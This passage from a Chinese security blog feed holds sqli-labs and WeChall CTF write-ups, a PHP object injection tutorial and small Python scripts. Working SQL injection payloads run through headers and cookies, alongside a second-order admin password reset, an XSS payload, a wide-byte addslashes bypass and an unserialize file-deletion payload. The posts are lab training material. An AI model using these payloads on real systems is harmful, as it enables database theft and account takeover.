$insert=&quot;INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES (&apos;$uagent&apos;, &apos;$IP&apos;, $uname)&quot;;
</code></pre><p>首先，抓包。</p>
<p>还有一个问题就是，insert into 语句要在登陆成功后才能执行，所以必须输入正确的用户和密码再抓包。</p>
<pre><code>xpath注入：
payload：updatexml(1,concat(0x7e,(version())),0)
第一个参数是 目标xml
第二个参数是 xpath的表达式，这个看w3c那个xpath教程
第三个参数是 要将xpath的表达式的东西将目标xml替换成什么
</code></pre><p>POC:</p>
<pre><code>User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:47.0) Gecko/20100101 Firefox/47.0&apos; or updatexml(0,concat(0x3a,version()),0),&quot;,&quot;)#
响应：
Your User Agent is: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:47.0) Gecko/20100101 Firefox/47.0&apos; or updatexml(0,concat(0x3a,version()),0),&quot;1&quot;)#
XPATH syntax error: &apos;:5.5.47&apos;

User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:47.0) Gecko/20100101 Firefox/47.0&apos; or updatexml(0,concat(0x3a,(select username from users limit 0,1)),0),&quot;1&quot;)#
响应：
Your User Agent is: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:47.0) Gecko/20100101 Firefox/47.0&apos; or updatexml(0,concat(0x3a,(select username from users limit 0,1)),0),&quot;1&quot;)
XPATH syntax error: &apos;:Dumb&apos;
</code></pre><h1 id="Less-19"><a href="#Less-19" class="headerlink" title="Less-19"></a>Less-19</h1><p>POC:</p>
<pre><code>Referer: 1&apos; or updatexml(0,concat(0x3a,version()),0),&quot;1&quot;)#
响应：
Your Referer is: 1&apos; or updatexml(0,concat(0x3a,version()),0),&quot;1&quot;)
XPATH syntax error: &apos;:5.5.47&apos;
</code></pre><p>这里也可以用一个报错函数extractvalue</p>
<p>第一个参数也是个xml，第二个参数就是xpath的表达式，这个函数是获取xml中某个节点的值</p>
<p>与updatexml一次只能更新一个节点不同，extractvalue可以一次获取多个节点的值，并以空格分隔</p>
<p>POC:</p>
<pre><code>Referer: 1&apos; or extractvalue(0,concat(0x3a,version())),&apos;1&apos;)#
响应：
Your User Agent is: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:47.0) Gecko/20100101 Firefox/47.0&apos; or extractvalue(0,concat(0x3a,version())),&apos;1&apos;)#
XPATH syntax error: &apos;:5.5.47&apos;
</code></pre><h1 id="Less-20"><a href="#Less-20" class="headerlink" title="Less-20"></a>Less-20</h1><p>这题用 Cookies 注入</p>
<p>POC:</p>
<pre><code>Cookie: uname=admin&apos;;
报错
Cookie: uname=admin&apos; order by 3#;
正常显示
Cookie: uname=admin&apos; order by 4#;
报错，所以是三个字段
Cookie: uname=admin&apos; and 1=2 union select 1,2,3#;
显示2，3
Cookie: uname=admin&apos; and 1=2 union select 1,database(),version()#;
数据库：security,版本：5.5.47
Cookie: uname=admin&apos; and 1=2 union select 1,2,group_concat(table_name） from information_schema.tables where table_schema=database()#;
表名：emails,referers,uagents,users，这里也可以用limit语句
Cookie: uname=admin&apos; and 1=2 union select 1,2,group_concat(column_name) from information_schema.columns where table_name=0x7573657273#;
字段：user_id,first_name,last_name,user,password,avatar,last_login,failed_login,id,username,password
Cookie: uname=admin&apos; and 1=2 union select 1,username,password from users limit 0,1#;
内容：Your Login name:Dumb Your Password:Dumb
</code></pre><h1 id="Less-21"><a href="#Less-21" class="headerlink" title="Less-21"></a>Less-21</h1><p>cookies 注入</p>
<p>但是，这一次的 cookies 是加密的.</p>
<pre><code>setcookie(&apos;uname&apos;, base64_encode($row1[&apos;username&apos;]), time()+3600);
...
$cookee = base64_decode($cookee);
</code></pre><p>POC:</p>
<pre><code>&apos;) union select 1,2,username from users#
JykgdW5pb24gc2VsZWN0IDEsMix1c2VybmFtZSBmcm9tIHVzZXJzIw==
显示密码Dumb
</code></pre><h1 id="Less-22"><a href="#Less-22" class="headerlink" title="Less-22"></a>Less-22</h1><p>单引号换成双引号就行了</p>
<pre><code>uname=IiB1bmlvbiBzZWxlY3QgMSwyLHVzZXJuYW1lIGZyb20gdXNlcnMj
Your Login name:2
Your Password:Dum
</code></pre><h1 id="Less-23"><a href="#Less-23" class="headerlink" title="Less-23"></a>Less-23</h1><p>这一题它在输入的时候过滤了几个字符</p>
<pre><code>$reg = &quot;/#/&quot;;
$reg1 = &quot;/--/&quot;;
$replace = &quot;&quot;;
$id = preg_replace($reg, $replace, $id);
$id = preg_replace($reg1, $replace, $id);
</code></pre><p>所以，我们不能用 #来注释掉剩下的查询语句。</p>
<p>那么该怎么办呢？</p>
<p>一个办法就是，让剩下的语句变得完整就行。</p>
<p>查询语句的代码为：</p>
<blockquote>
<p>$sql=”SELECT * FROM users WHERE id=’$id’ LIMIT 0,1”;</p>
</blockquote>
<p>构造语句：</p>
<blockquote>
<p>?id=1’and+’1’=’1</p>
</blockquote>
<h1 id="Less-24"><a href="#Less-24" class="headerlink" title="Less-24"></a>Less-24</h1><p>二次注入</p>
<p>与数据库交互的有三个页面：login_create.php，login.php，pass_change.php</p>
<p>login_create.php,登陆页面对用户和密码都进行了处理。</p>
<pre><code>$username = mysql_real_escape_string($_POST[&quot;login_user&quot;]);
$password = mysql_real_escape_string($_POST[&quot;login_password&quot;]);
$sql = &quot;SELECT * FROM users WHERE username=&apos;$username&apos; and password=&apos;$password&apos;&quot;;
</code></pre><p>login_create.php对新建用户进行处理</p>
<pre><code>$username=  mysql_escape_string($_POST[&apos;username&apos;]) ;
$pass= mysql_escape_string($_POST[&apos;password&apos;]);
$re_pass= mysql_escape_string($_POST[&apos;re_password&apos;]);
</code></pre><p>pass_change.php是修改密码的</p>
<p>关键代码：</p>
<pre><code>$username= $_SESSION[&quot;username&quot;];
$curr_pass= mysql_real_escape_string($_POST[&apos;current_password&apos;]);
$pass= mysql_real_escape_string($_POST[&apos;password&apos;]);
$re_pass= mysql_real_escape_string($_POST[&apos;re_password&apos;]);
if($pass==$re_pass)
{    
    $sql = &quot;UPDATE users SET PASSWORD=&apos;$pass&apos; where username=&apos;$username&apos; and password=&apos;$curr_pass&apos; &quot;;
    $res = mysql_query($sql) or die(&apos;You tried to be smart, Try harder!!!! :( &apos;);
    $row = mysql_affected_rows();
    ...
</code></pre><p>可以发现</p>
<blockquote>
<p>$sql = “UPDATE users SET PASSWORD=’$pass’ where username=’$username’ and password=’$curr_pass’ “;</p>
</blockquote>
<p>更改密码时$username没有任何过滤，直接带入进去，如果$username后面有个注释符，那么我们可以直接绕过验证$curr_pass而直接更改密码。</p>
<p>所以我们要建一个有注释符的特殊用户</p>
<pre><code>用户名：admin&apos;+#+
密码： 123456
</code></pre><p>然后登陆，进入更改密码页面</p>
<p>随便输入当前密码，然后输入我们要更改的密码</p>
<pre><code>YOU ARE LOGGED IN AS
admin&apos; # 

You can Change your password here.
Current Password: 123    
New Password:     123456
Retype Password:     123456
</code></pre><p>提交，你会发现，admin的密码已经被我们改成123456了。</p>
<h1 id="Less-25"><a href="#Less-25" class="headerlink" title="Less-25"></a>Less-25</h1><p>这题的意思是，“你的 AND 和 OR 都是我们的了！”…</p>
<p>就是，AND 和 OR 全部都被过滤掉了。</p>
<pre><code>AND==&amp;&amp;
OR==||

?id=1&apos; &amp;&amp; &apos;1&apos;=&apos;1
url编码
?id=1&apos; %26%26 &apos;1&apos;=&apos;1
</code></pre>]]></content>
      
        
        <tags>
            
            <tag> SQL注入 </tag>
            
            <tag> writeup </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[python实现MD5,Base64加密小工具]]></title>
      <url>/2016/07/29/python%E5%AE%9E%E7%8E%B0MD5_Base64%E5%8A%A0%E5%AF%86%E5%B0%8F%E5%B7%A5%E5%85%B7/</url>
      <content type="html"><![CDATA[<p>程序是一个 Base64 和 MD5 加密解密的程序。很简单，主要用到了hashlib和base64这两个库。而且，有这两个库，可以随时拓展更多种加密方式，像是 sha 啊什么的。要注意的就是下面几点：</p>
<a id="more"></a>
<h2 id="1）input-和raw-input-的区别。"><a href="#1）input-和raw-input-的区别。" class="headerlink" title="1）input()和raw_input()的区别。"></a>1）input()和raw_input()的区别。</h2><p>input()要求的输入的字符串要加双引号，数字的话，直接输入就可以了。</p>
<p>raw_input()函数将输入的所有数据都当做字符串来看待，即使输入的数字，也会变成是字符串的形式。而且，我们经常要在程序运行到某处的时候中断一下。那么，就可以用raw_input()这个函数来中断。输入回车就继续运行了。若是用input()中断的话，直接回车会爆错。。</p>
<h2 id="2）Python-里面貌似没有主函数的说法"><a href="#2）Python-里面貌似没有主函数的说法" class="headerlink" title="2）Python 里面貌似没有主函数的说法"></a>2）Python 里面貌似没有主函数的说法</h2><p>没有main()，没有入口点。那么怎么办呢？可以用下面的代码：</p>
<pre><code>if __name__==&quot;__main__&quot;:
    Index();    //你的第一个函数
</code></pre><p>这样就可以让程序从第一个函数开始运行了。</p>
<h2 id="3）千万注意-TAB-和空格。"><a href="#3）千万注意-TAB-和空格。" class="headerlink" title="3）千万注意 TAB 和空格。"></a>3）千万注意 TAB 和空格。</h2><p>也就是代码的格式。Python 是一个很注重格式的语言。因为没有大括号之类的，所以像是循环语句，判断语句的，一定要注意语句前面的 TAB。而且，千万不要 TAB 和空格混用！会报错.</p>
<pre><code>import hashlib
import base64
def Index():
    print(&quot;---------Joy_nick&apos;s Encrypt Tool---------&quot;);
    print(&quot;Please choose one:&quot;);
    print(&quot;1) MD5&quot;);
    print(&quot;2) Base64&quot;);
    while(1):
        choose=input();
        if(choose==1):
            Page_MD5();
        elif(choose==2):
            Page_Base64();

def Page_MD5():
    print(&quot;----------------MD5----------------&quot;);
    print(&quot;Please choose one:&quot;);
    print(&quot;1) MD5 Encrypt&quot;);
    print(&quot;2) MD5 Check&quot;);
    while(1):
        choose=input();
        if(choose==1):
            Page_MD5_Encrypt();
        elif(choose==2):
            Page_MD5_Check();

def Page_Base64():
    print(&quot;--------------Base64---------------&quot;);
    print(&quot;Please choose one:&quot;);
    print(&quot;1) Base64 Encrypt&quot;);
    print(&quot;2) Base64 Decrypt&quot;);
    while(1):
        choose=input();
        if(choose==1):
            Page_Base64_Encrypt();
        elif(choose==2):
            Page_Base64_Decrypt();

def Input_From_File():
    path=raw_input(&quot;Please input the file path : &quot;);
    file_handle=open(path,&apos;r&apos;);
    file_contant=file_handle.read();
    file_handle.close();
    return file_contant;

def Input_From_Stdin():
    contant=raw_input(&quot;Please input : &quot;);
    return contant;

def Page_MD5_Encrypt():
    print(&quot;-----------MD5 Encrypt------------&quot;);
    print(&quot;Please choose one:&quot;);
    print(&quot;1) Input from file&quot;);
    print(&quot;2) Input&quot;);
    while(1):
        choose=input();
        if(choose==1):
            contant=Input_From_File();
            break;
        elif(choose==2):
            contant=Input_From_Stdin();
            break;
    m=hashlib.md5()
    m.update(contant);
    print(&quot;Do you want to output to a file?(y or n)&quot;);
    while(1):
        choose=raw_input();
        if(choose==&apos;y&apos;):
            file_handle=open(m.hexdigest(),&apos;w&apos;);
            file_handle.write(m.hexdigest());
            file_handle.close();
            exit();
        elif(choose==&apos;n&apos;):
            print(m.hexdigest());
            raw_input();
            exit();

def Page_MD5_Check():
    print(&quot;-----------MD5 Check------------&quot;);
    print(&quot;Please choose one:&quot;);
    print(&quot;1) Input from file&quot;);
    print(&quot;2) Input&quot;);
    while(1):
        choose=input();
        if(choose==1):
            contant=Input_From_File();
            break;
        elif(choose==2):
            contant=Input_From_Stdin();
            break;
    m=hashlib.md5()
    m.update(contant);
    MD5=raw_input(&quot;Please input the original MD5:&quot;);
    if(MD5==m.hexdigest()):
        print(&quot;It&apos;s a correct file.&quot;);
    else:
        print(&quot;The file is wrong.&quot;);
    raw_input();
    exit();

def Page_Base64_Encrypt():
    print(&quot;-------------Base64 Encrypt----------------&quot;);
    print(&quot;Please choose one:&quot;);
    print(&quot;1) Input from a file&quot;);
    print(&quot;2) Input&quot;);
    while(1):
        choose=input();
        if(choose==1):
            contant=Input_From_File();
            break;
        elif(choose==2):
            contant=Input_From_Stdin();
            break;
    m=base64.b64encode(contant);
    choose=raw_input(&quot;Do you want to save it to a file?(y or n)&quot;);
    while(1):
        if(choose==&apos;y&apos;):
            file_handle=open(&quot;Base64_%c&quot;%m[1],&apos;w&apos;);
            file_handle.write(m);
            file_handle.close();
            exit();
        elif(choose==&apos;n&apos;):
            print(m);
            raw_input();
            exit();

def Page_Base64_Decrypt():
    print(&quot;--------------Base64 Decrypt------------------&quot;);
    print(&quot;Please choose one:&quot;);
    print(&quot;1) Input from a file&quot;);
    print(&quot;2) Input&quot;);
    while(1):
        choose=input();
        if(choose==1):
            contant=Input_From_File();
            break;
        elif(choose==2):
            contant=Input_From_Stdin();
            break;
    m=base64.b64decode(contant);
    choose=raw_input(&quot;Do you want to save it to a file?(y or n)&quot;);
    while(1):
        if(choose==&apos;y&apos;):
            file_handle=open(&quot;Base64_%c&quot;%m[2],&apos;w&apos;);
            file_handle.write(m);
            file_handle.close();
            exit();
        elif(choose==&apos;n&apos;):
            print(m);
            raw_input();
            exit();

if __name__==&quot;__main__&quot;:
    print(&quot;main&quot;);
    Index();
</code></pre>]]></content>
      
        
        <tags>
            
            <tag> 编程 </tag>
            
            <tag> 加密解密 </tag>
            
            <tag> Python </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[python脚本之正则表达式]]></title>
      <url>/2016/07/28/python%E8%84%9A%E6%9C%AC%E4%B9%8B%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/</url>
      <content type="html"><![CDATA[<h1 id="Impossible-n’est-pas-francais"><a href="#Impossible-n’est-pas-francais" class="headerlink" title="Impossible n’est pas français"></a>Impossible n’est pas français</h1><p>webchall的一道题，题目要求分解一个很大的数的质因数。需要6s 内提交 但是，只要我们尝试提交一次之后，就可以发现它会返回一个正确的解。<br><a id="more"></a><br>既然如此，我们只要先提交一次，然后程序读取它返回的正确数字串，再提交就可以了。</p>
<p>在匹配网页信息的时候，python可以使用库beautifulsoup也可以使用正则表达式re模块，这里我两个都用了，便于自己学习。</p>
<p>python脚本如下：</p>
<pre><code>#!/usr/bin/env python
# coding=utf-8
import requests
import urllib2
import lxml
import lxml.html as H
from bs4 import BeautifulSoup

cookie = {
    &apos;WC&apos;: &apos;9038838-0-DGwGp7VNYefa6o7o&apos;
}
def get_number():
    number_url = &apos;http://www.wechall.net/challenge/impossible/index.php?request=new_number&apos;
    #opener = urllib2.build_opener()
    #opener.addheaders.append((&apos;Cookie&apos;,&apos;WC=9038838-0-DGwGp7VNYefa6o7o&apos;))
    #f = opener.open(number_url)
    #html = f.read()
    #html = urllib2.urlopen(number_url).read()
    #soup = BeautifulSoup(html)
    resp = requests.get(number_url, cookies=cookie)
    res =resp.content
    soup = BeautifulSoup(res)
    div_new = soup.find(&apos;div&apos;,{&quot;id&quot;:&quot;page&quot;})
    movie_new = div_new.get_text()
    print movie_new
get_number()

def get_answer():
    post_data = {
        &apos;solution&apos;: &apos;&apos;,
        &apos;cmd&apos;: &apos;Send&apos;,
        &apos;gwf3_csrf&apos;: &apos;bNZbC2XL&apos;
    }
    url = &apos;http://www.wechall.net/challenge/impossible/index.php&apos; 
    resp = requests.post(url, cookies=cookie, data=post_data)
    # print resp.text
    d = H.document_fromstring(resp.text)
    import re
    ar = re.compile(r&apos;&quot;(\d+)&quot;&apos;)
    text = d.xpath(&apos;//div[@class=\&apos;gwf_errors\&apos;]/ul/li&apos;)[0].text_content()
    ans = ar.findall(text)[0]

    print ans 

    post_data = {
        &apos;solution&apos;: ans,
        &apos;cmd&apos;: &apos;Send&apos;,
        &apos;gwf3_csrf&apos;: &apos;bNZbC2XL&apos;
    }
    resp = requests.post(url, cookies=cookie, data=post_data)
    print resp.text
get_answer()
</code></pre><p>运行结果为：</p>
<p><img src="http://oa8y5guqs.bkt.clouddn.com/wechall_yinshifenjie.png" alt=""></p>
]]></content>
      
        
        <tags>
            
            <tag> 编程 </tag>
            
            <tag> 爬虫 </tag>
            
            <tag> Python </tag>
            
            <tag> writeup </tag>
            
            <tag> WeChall </tag>
            
            <tag> 正则表达式 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[PHP Object Injection]]></title>
      <url>/2016/07/24/PHP-Object-Injection/</url>
      <content type="html"><![CDATA[<p>PHP对象注入并不是一种十分常见的漏洞，这种漏洞可能会比较难利用，但是这种漏洞可能比较危险。为了学习这种漏洞，首先需要理解基础的PHP代码。<br><a id="more"></a></p>
<h1 id="0x01-PHP的类和对象"><a href="#0x01-PHP的类和对象" class="headerlink" title="0x01 PHP的类和对象"></a>0x01 PHP的类和对象</h1><p>HP中的类和对象理解起来很简单，举个例子来说，下面的代码中就定义了一个包含一个变量和一个方法的类：</p>
<pre><code>&lt;?php
class TestClass        //定义一个TestClass类
{
public $variable = &apos;This is a string&apos;;          // 一个变量
public function PrintVariable()          // 一个简单的方法
{
    echo $this-&gt;variable;
}
}
$object = new TestClass();        // 创建一个对象
$object-&gt;PrintVariable();        // 调用类的方法
?&gt;
</code></pre><h1 id="0x02-PHP自动载入"><a href="#0x02-PHP自动载入" class="headerlink" title="0x02 PHP自动载入"></a>0x02 PHP自动载入</h1><p>在PHP中，我们可以定义一些特殊函数，它们可以被自动地调用，所以这些函数不需要函数调用来执行它们里面的代码。考虑到这个特性，这些函数通常被称为魔幻函数或魔幻方法。魔幻方法的名字以双下划线“__”开头PHP魔幻方法名称受限于PHP所支持的部分关键字，例如construct、destruct等等。</p>
<p>例如__construct()方法会在一个对象被创建时自动调用，对应的__destruct则会在一个对象被销毁时调用等等。</p>
<p>下面是PHP中的一些魔幻函数：</p>
<pre><code>__construct(), __destruct(), __call(), __callStatic(), __get(), __set(),
__isset(), __unset(), __sleep(), __wakeup(), __toString(), 
__invoke(), __set_state(), __clone(), and __autoload().
</code></pre><h1 id="0x03-PHP对象的序列化与反序列化"><a href="#0x03-PHP对象的序列化与反序列化" class="headerlink" title="0x03 PHP对象的序列化与反序列化"></a>0x03 PHP对象的序列化与反序列化</h1><p>php允许保存一个对象方便以后重用，这个过程被称为序列化，即serialize()函数，对应的反序列化就是unserialize()。<br>简单的说，序列化就是把PHP对象按照一定规则存成一个字符串，而反序列化就是把序列化之后的字符串恢复成一个PHP对象.</p>
<p><strong>PHP对象的序列化</strong></p>
<p><img src="http://oa8y5guqs.bkt.clouddn.com/%E5%BA%8F%E5%88%97%E5%8C%961-1.png" alt=""></p>
<p>理解序列化的字符串:</p>
<pre><code>O:4{               以分号隔开，一共有四段数据

&quot;test&quot;:2           test类，一共有2个对象

s:8:&quot;username&quot;     String类型, 长度为8, 值为username

s:6:&quot;serial&quot;       String类型, 长度为6, 值为serial

s:8:&quot;password&quot;     String类型, 长度为8, 值为password

s:6:&quot;serial&quot;       String类型, 长度为6, 值为serial
</code></pre><p><strong>PHP对象的反序列化</strong></p>
<p><img src="http://oa8y5guqs.bkt.clouddn.com/%E5%BA%8F%E5%88%97%E5%8C%961-2.png" alt=""></p>
<p>经过unserialize()之后，我们的对象又被重建了出来.</p>
<h1 id="0x04-PHP对象注入"><a href="#0x04-PHP对象注入" class="headerlink" title="0x04 PHP对象注入"></a>0x04 PHP对象注入</h1><p>有两个比较特别的Magic方法，__sleep 方法会在一个对象被序列化的时候调用。 __wakeup方法会在一个对象被反序列化的时候调用。</p>
<p>那么，考虑这么一个场景，如果一个攻击者的数据是通过unserialize()方法传递的，那么这样就很可能引发“php对象注入”，而很可能那些与该对象有关的Magic方法会执行一些效果，打个比方，如果该对象是一个记录临时文件的对象，当对象创建的时候，即会调用 __construct方法，此时会创建一个文件，而 __destruct则会删除创建的文件。而此时恰好我们可以构造输入通过unserialize()传递，那么我们就可以对我们的输入稍作加工就可以完成输入我们想要输入的。</p>
<p>示例代码：</p>
<pre><code>&lt;?php 
class test
{
    public $filename = &apos;temp.txt&apos;;
    public function LogData($text)
    {
        file_put_contents($this-&gt;filename, $text, FILE_APPEND);        //file_put_contents() 函数把一个字符串写入文件中。与依次调用 fopen()，fwrite() 以及 fclose() 功能一样。
    }
    public function __destruct()
    {
        unlink(dirname(__FILE__) . &apos;/&apos; . $this-&gt;filename);        //unlink() 函数删除文件
    }
}
class user
{
    public $age = 0;
    public $name = &apos;&apos;;
    public function PrintData()
    {
        echo &apos;Username:&apos;.$this-&gt;name.&apos;&lt;br&gt;&apos;.&apos;age:&apos;.$this-&gt;age;
    }
}
if(isset($_GET[&apos;user&apos;]))
    $usr = unserialize($_GET[&apos;user&apos;]);
?&gt;
</code></pre><p>定义了一个test类生成一个临时文件和一个user类，最后有一个 “unserialize” 值，它的本意是传递user的信息，但是如果我们输入一个字符串最后能够被反序列化为test类，那么问题就关键了，因为一个test类最后会删除它的同名文件夹，如果此时我们通过如下代码构造一串字符串：</p>
<pre><code>&lt;?php
//include &apos;object_injection.php&apos;;
class test{}
$obj = new test();
$obj-&gt;filename = &apos;.htaccess&apos;;
echo serialize($obj) . &apos;&lt;br /&gt;&apos;;
?&gt;
</code></pre><p>运行结果为：</p>
<blockquote>
<p>O:4:”test”:1:{s:8:”filename”;s:9:”.htaccess”;}</p>
</blockquote>
<p>新建一个<code>.htaccess</code>的文件,然后将打印出来的结果传入到之前那个php中，那么最终删除的就是这个’.htaccess’文件了。因为脚本结束时 __destruct会被调用，从而触发删除。</p>
<p><img src="http://oa8y5guqs.bkt.clouddn.com/%E5%BA%8F%E5%88%97%E5%8C%961-3.png" alt=""></p>
<p>这就是该漏洞名字的由来：作为一个攻击者，为了实现执行你的代码或者对你来说其他未预料到的有用的表现，不使用期望的序列化的对象，而是注入其他的PHP对象。</p>
<h1 id="0x05-PHP对象注入防御"><a href="#0x05-PHP对象注入防御" class="headerlink" title="0x05 PHP对象注入防御"></a>0x05 PHP对象注入防御</h1><p>在处理由用户提供数据的地方不要使用“unserialize”，你可以使用“json_decode”。</p>
]]></content>
      
        
        <tags>
            
            <tag> 渗透测试 </tag>
            
            <tag> PHP </tag>
            
            <tag> 反序列化 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Wechall CTF writeup2]]></title>
      <url>/2016/07/23/Webchall-CTF-writeup2/</url>
      <content type="html"><![CDATA[<h2 id="htmlspecialchars"><a href="#htmlspecialchars" class="headerlink" title="htmlspecialchars"></a>htmlspecialchars</h2><p>htmlspecialchars()不加参数只会将双引号实体化，这里只需要单引号即可。<br><a id="more"></a></p>
<p>在本地搭建环境，代码如下：</p>
<pre><code>&lt;?php
if(isset($_GET[&apos;in&apos;]))
{
    $a=$_GET[&apos;in&apos;];
    echo &quot;&lt;a href=&apos;http://&quot;.htmlspecialchars($a).&quot;&apos;&gt;Exploit Me&lt;/a&gt;&quot;;
    echo htmlspecialchars(&quot;&lt;a href=&apos;http://&quot;.htmlspecialchars($a).&quot;&apos;&gt;Exploit Me&lt;/a&gt;&quot;);
}
?&gt;
</code></pre><p>输入以下代码：</p>
<blockquote>
<p><a href="http://127.0.0.1:8080/xss/test.php?in=%27%20onmouseover=%27alert(1" target="_blank" rel="external">http://127.0.0.1:8080/xss/test.php?in=%27%20onmouseover=%27alert(1</a>)</p>
</blockquote>
<p>然后鼠标触发即可弹窗。</p>
<p><img src="http://oa8y5guqs.bkt.clouddn.com/webchall_htmlspecialchars.png" alt=""></p>
<h2 id="Connect-the-Dots"><a href="#Connect-the-Dots" class="headerlink" title="Connect the Dots"></a>Connect the Dots</h2><p>盲文密码</p>
<p><img src="http://oa8y5guqs.bkt.clouddn.com/wechall_Connect%20the%20Dots.jpg" alt=""></p>
<p>解密为：<code>thesolutionis***</code></p>
<h2 id="Tracks"><a href="#Tracks" class="headerlink" title="Tracks"></a>Tracks</h2><p>主要分三步：</p>
<pre><code>1.注册
2.投票
3.说已投过了
</code></pre><p>通过改它请求的地址，来改变http缓存。第二步的时候发现响应头有个Etag字段，这个和请求头里面的<code>If-None-Match</code>进行匹配。</p>
<p><a href="http://www.iteye.com/topic/656658" target="_blank" rel="external">HTTP协议缓存策略</a></p>
<p>修改请求头里的WC字段和VOTE字段即可。</p>
<p><img src="http://oa8y5guqs.bkt.clouddn.com/wechall_tracks.png" alt=""></p>
<h2 id="PHP-0818"><a href="#PHP-0818" class="headerlink" title="PHP 0818"></a>PHP 0818</h2><p>PHP弱类型</p>
<p>首先看一下源码：</p>
<pre><code>function noother_says_correct($number)
{
    $one = ord(&apos;1&apos;);
    $nine = ord(&apos;9&apos;);
    for ($i = 0; $i &lt; strlen($number); $i++)
    { 
        $digit = ord($number{$i});
        if ( ($digit &gt;= $one) &amp;&amp; ($digit &lt;= $nine) )
        {
            return false;
        }
    }
    return $number == &quot;3735929054&quot;;
}
</code></pre><p>主要的意思就是不能是<code>1~9</code>的数字，但是又要和<code>3735929054</code>相等，明显是PHP弱类型由于是==，</p>
<pre><code>===会比较两个变量的类型 
而==只比较他们的值  
比如整数0和浮点数0.0   
用==比较返回TRUE   
用===比较返回FLASE
</code></pre><p>3735929054的十六进制即0xdeadc0de,0又刚好不在1-9里面，符合。</p>
<p><img src="http://oa8y5guqs.bkt.clouddn.com/wechall_php0818.png" alt=""></p>
<h2 id="Addslashes"><a href="#Addslashes" class="headerlink" title="Addslashes"></a>Addslashes</h2><p>addslashes()函数的功能是返回在预定义字符之前添加反斜杠的字符串。</p>
<p>主要的源码如下：</p>
<pre><code>&lt;?php
function asvsmysql_login($username, $password)
{
    $username = addslashes($username);
    $password = md5($password);
    ...
    $query = &quot;SELECT username FROM users WHERE username=&apos;$username&apos; AND password=&apos;$password&apos;&quot;;
    ...
    if ($result[&apos;username&apos;] !== &apos;Admin&apos;) {
        return htmlDisplayError(&apos;You are logged in, but not as Admin.&apos;);
    }

    return htmlDisplayMessage(&apos;You are logged in. congrats!&apos;);
}
?&gt;
</code></pre><p>addslashes()函数存在宽字节注入漏洞。原因是%bf%27本身不是一个有效的GBK字符，但经过addslashes()转换后变为%bf%5c%27，前面的%bf%5c是个有效的GBK字符，所以%bf%5c%27就会当作一个字符加一个单引号，这样漏洞就触发了。mysql_real_escape_string()也是一样。</p>
<p>输入</p>
<blockquote>
<p>%bf%27 union select Admin%23&amp;password=123</p>
</blockquote>
<p>报错，说不识别这五个字母，然后就是把字母转换成字符</p>
<blockquote>
<p>%bf%27 union select CHAR(65,100,109,105,110)%23&amp;password=123</p>
</blockquote>
<p><img src="http://oa8y5guqs.bkt.clouddn.com/wechall_Addslashes.png" alt=""></p>
<h2 id="The-Guestbook"><a href="#The-Guestbook" class="headerlink" title="The Guestbook"></a>The Guestbook</h2><p>源码很长，也没仔细看，首先就是先做了一个正常的留言，返回的结果如下：</p>
<p><img src="http://oa8y5guqs.bkt.clouddn.com/wechall_guestbook1.png" alt=""></p>
<p>仔细看，我们就可以发现一个蹊跷，就是返回一个ip:8.8.8.8这是我火狐的一个插件，然后我就试试，在里面插入一些恶意代码:</p>
<pre><code>$query =
        &quot;CREATE TABLE IF NOT EXISTS gbook_user ( &quot;.
        &quot;gbu_id        INT(11)     UNSIGNED PRIMARY KEY, &quot;. # Guestbook userid
        &quot;gbu_name      VARCHAR(63) CHARACTER SET ASCII COLLATE ascii_general_ci, &quot;. # Guestbook username
        &quot;gbu_password  VARCHAR(255) CHARACTER SET ASCII COLLATE ascii_bin ) &quot;; # Guestbook password &lt;-- You need the password for username Admin
    $db-&gt;queryWrite($query);
</code></pre><p>上面的代码看出表名是：<code>gbook_user</code>，字段:<code>gbu_password,gbu_name</code></p>
<p>根据GET ip的查询语句，构造如下：</p>
<blockquote>
<p>‘,(select gbu_password from gbook_user where gbu_name=’admin’))#</p>
</blockquote>
<p><img src="http://oa8y5guqs.bkt.clouddn.com/wechall_guestbook2.png" alt=""></p>
<h2 id="PHP-0816"><a href="#PHP-0816" class="headerlink" title="PHP 0816"></a>PHP 0816</h2><p>题目要求我们读<code>solution.php</code>这个文件。</p>
<p>主要就是几个参数，src，hl，mode，它是按顺序读取参数值的， </p>
<pre><code>php0816SetSourceFile主要是设置显示源码的文件名，有一个白名单过滤，它会读取src， 
然后是php0816execute执行程序mode=hl， 
然后就是php0816addHighlights，它调用php0816Highlighter，而这个函数直接有一个getGet(&apos;src&apos;)
所以我们可以直接执行mode=hl&amp;src=solution.php，，这样就没有访问php0816SetSourceFile这个函数。直接读取了solution.php
</code></pre><p>POC：</p>
<blockquote>
<p><a href="http://www.wechall.net/challenge/php0816/code.php?mode=hl&amp;src=solution.php" target="_blank" rel="external">http://www.wechall.net/challenge/php0816/code.php?mode=hl&amp;src=solution.php</a></p>
</blockquote>
<p><img src="http://oa8y5guqs.bkt.clouddn.com/wechall_php0816.png" alt=""></p>
<h2 id="Table-Names"><a href="#Table-Names" class="headerlink" title="Table Names"></a>Table Names</h2><p>在username加个’ 报错了，存在注入 ，构造语句。</p>
<pre><code>1&apos; order by 4#   报错
1&apos; order by 3#    正确
三个字段
1&apos; and 1=2 union select 1,2,3#
显示3
1&apos; and 1=2 union select 1,2,database()#
数据库名：gizmore_tableu61
1&apos; and 1=2 union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=0x67697A6D6F72655F7461626C65753631#
两个表名：aaawrong,usertableus4
</code></pre><p>TMD 对于答案也是醉了,还得连一块：</p>
<blockquote>
<p>gizmore_tableu61_usertableus4</p>
</blockquote>
<p><img src="http://oa8y5guqs.bkt.clouddn.com/wechall_table_names.png" alt=""></p>
<h2 id="Training-RegexMini"><a href="#Training-RegexMini" class="headerlink" title="Training: RegexMini"></a>Training: RegexMini</h2><p>正则匹配</p>
<p>成功的要求是输入一个长度 &gt; 16 位的一个用户名，并成功注册。</p>
<p>正则表达式为：</p>
<blockquote>
<p><code>/^[a-zA-Z]{1,16}$/</code></p>
</blockquote>
